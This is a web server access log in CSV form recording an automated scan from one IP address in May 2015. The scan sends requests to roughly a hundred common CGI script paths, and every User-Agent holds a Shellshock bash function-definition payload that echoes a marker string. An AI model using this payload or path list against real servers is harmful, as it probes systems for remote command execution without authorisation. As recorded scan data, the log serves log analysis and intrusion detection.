"Host","Log Name","Date Time","Time Zone","Method","URL","Response Code","Bytes Sent","Referer","User Agent"
"5.196.35.248","-","2015-05-12 03:34:37","GMT-0700","GET","/cart.cgi",404,492,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:37","GMT-0700","GET","/catalog/index.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:38","GMT-0700","GET","/ccbill/whereami.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:38","GMT-0700","GET","/cgi-bin/",403,496,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:38","GMT-0700","GET","/cgi-bin/14all-1.1.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:38","GMT-0700","GET","/cgi-bin/14all.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:39","GMT-0700","GET","/cgi-bin/%2f/admin.html",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:39","GMT-0700","GET","/cgi-bin/a1disp3.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:39","GMT-0700","GET","/cgi-bin/a1stats/a1disp3.cgi",404,511,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:40","GMT-0700","GET","/cgi-bin/a1stats/a1disp4.cgi",404,511,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:40","GMT-0700","GET","/cgi-bin/addbanner.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:40","GMT-0700","GET","/cgi-bin/add_ftp.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:41","GMT-0700","GET","/cgi-bin/adduser.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:41","GMT-0700","GET","/cgi-bin/admin/admin.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:41","GMT-0700","GET","/cgi-bin/admin.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:42","GMT-0700","GET","/cgi-bin/adminhot.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:42","GMT-0700","GET","/cgi-bin/admin.html",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:42","GMT-0700","GET","/cgi-bin/admin.pl",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:43","GMT-0700","GET","/cgi-bin/admin/setup.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:43","GMT-0700","GET","/cgi-bin/adminwww.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:43","GMT-0700","GET","/cgi-bin/af.cgi",404,498,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:44","GMT-0700","GET","/cgi-bin/aglimpse.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:44","GMT-0700","GET","/cgi-bin/alienform.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:44","GMT-0700","GET","/cgi-bin/AnyBoard.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:45","GMT-0700","GET","/cgi-bin/architext_query.cgi",404,511,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:45","GMT-0700","GET","/cgi-bin/astrocam.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:45","GMT-0700","GET","/cgi-bin/AT-admin.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:46","GMT-0700","GET","/cgi-bin/AT-generate.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:46","GMT-0700","GET","/cgi-bin/auction/auction.cgi",404,511,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:46","GMT-0700","GET","/cgi-bin/auktion.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:47","GMT-0700","GET","/cgi-bin/authLogin.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:47","GMT-0700","GET","/cgi-bin/ax-admin.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:47","GMT-0700","GET","/cgi-bin/ax.cgi",404,498,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:48","GMT-0700","GET","/cgi-bin/axs.cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:48","GMT-0700","GET","/cgi-bin/badmin.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:48","GMT-0700","GET","/cgi-bin/banner.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:49","GMT-0700","GET","/cgi-bin/bannereditor.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:49","GMT-0700","GET","/cgi-bin/bash",404,496,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:49","GMT-0700","GET","/cgi-bin/bb-ack.sh",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:50","GMT-0700","GET","/cgi-bin/bb-histlog.sh",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:50","GMT-0700","GET","/cgi-bin/bb-hist.sh",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:50","GMT-0700","GET","/cgi-bin/bb-hostsvc.sh",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:50","GMT-0700","GET","/cgi-bin/bb-replog.sh",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:51","GMT-0700","GET","/cgi-bin/bb-rep.sh",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:51","GMT-0700","GET","/cgi-bin/BBS/bbs_forum.cgi",404,509,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:51","GMT-0700","GET","/cgi-bin/bbs_forum.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:52","GMT-0700","GET","/cgi-bin/bigconf.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:52","GMT-0700","GET","/cgi-bin/bizdb1-search.cgi",404,509,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:52","GMT-0700","GET","/cgi-bin/blog/mt-check.cgi",404,509,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:53","GMT-0700","GET","/cgi-bin/blog/mt-load.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:53","GMT-0700","GET","/cgi-bin/bnbform.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:53","GMT-0700","GET","/cgi-bin/book.cgi",404,500,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:54","GMT-0700","GET","/cgi-bin/boozt/admin/index.cgi",404,513,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:54","GMT-0700","GET","/cgi-bin/bsguest.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:54","GMT-0700","GET","/cgi-bin/bslist.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:55","GMT-0700","GET","/cgi-bin/build.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:55","GMT-0700","GET","/cgi-bin/bulk/bulk.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:55","GMT-0700","GET","/cgi-bin/cached_feed.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:56","GMT-0700","GET","/cgi-bin/cachemgr.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:56","GMT-0700","GET","/cgi-bin/calendar/index.cgi",404,510,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:56","GMT-0700","GET","/cgi-bin/cartmanager.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:57","GMT-0700","GET","/cgi-bin/cbmc/forums.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:57","GMT-0700","GET","/cgi-bin/ccvsblame.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:57","GMT-0700","GET","/cgi-bin/c_download.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:58","GMT-0700","GET","/cgi-bin/cgforum.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:58","GMT-0700","GET","/cgi-bin/cgi.cgi",404,499,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:58","GMT-0700","GET","/cgi-bin/cgi_process",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:59","GMT-0700","GET","/cgi-bin/classified.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:59","GMT-0700","GET","/cgi-bin/classifieds.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:34:59","GMT-0700","GET","/cgi-bin/classifieds/classifieds.cgi",404,519,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:00","GMT-0700","GET","/cgi-bin/classifieds/index.cgi",404,513,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:00","GMT-0700","GET","/cgi-bin/.cobalt/alert/service.cgi",404,517,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:00","GMT-0700","GET","/cgi-bin/.cobalt/message/message.cgi",404,519,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:01","GMT-0700","GET","/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi",404,527,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:01","GMT-0700","GET","/cgi-bin/commandit.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:01","GMT-0700","GET","/cgi-bin/commerce.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:01","GMT-0700","GET","/cgi-bin/common/listrec.pl",404,509,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:02","GMT-0700","GET","/cgi-bin/compatible.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:02","GMT-0700","GET","/cgi-bin/contact.cgi",404,503,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:02","GMT-0700","GET","/cgi-bin/Count.cgi",404,501,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:03","GMT-0700","GET","/cgi-bin/csChatRBox.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:03","GMT-0700","GET","/cgi-bin/csGuestBook.cgi",404,507,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:03","GMT-0700","GET","/cgi-bin/csLiveSupport.cgi",404,509,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:04","GMT-0700","GET","/cgi-bin/CSMailto.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:04","GMT-0700","GET","/cgi-bin/CSMailto/CSMailto.cgi",404,513,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:04","GMT-0700","GET","/cgi-bin/csNews.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:05","GMT-0700","GET","/cgi-bin/csNewsPro.cgi",404,505,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:05","GMT-0700","GET","/cgi-bin/csPassword.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:05","GMT-0700","GET","/cgi-bin/csPassword/csPassword.cgi",404,517,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:06","GMT-0700","GET","/cgi-bin/csSearch.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:06","GMT-0700","GET","/cgi-bin/csv_db.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:06","GMT-0700","GET","/cgi-bin/cvsblame.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:07","GMT-0700","GET","/cgi-bin/cvslog.cgi",404,502,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:07","GMT-0700","GET","/cgi-bin/cvsquery.cgi",404,504,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:07","GMT-0700","GET","/cgi-bin/cvsqueryform.cgi",404,508,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:08","GMT-0700","GET","/cgi-bin/day5datacopier.cgi",404,510,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:08","GMT-0700","GET","/cgi-bin/day5datanotifier.cgi",404,512,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
"5.196.35.248","-","2015-05-12 03:35:08","GMT-0700","GET","/cgi-bin/db_manager.cgi",404,506,"http://google.com/search?q=2+guys+1+horse","() { goo;}; echo Content-Type: text/plain ; echo ; echo shellshot_`expr 1344 - 7`"
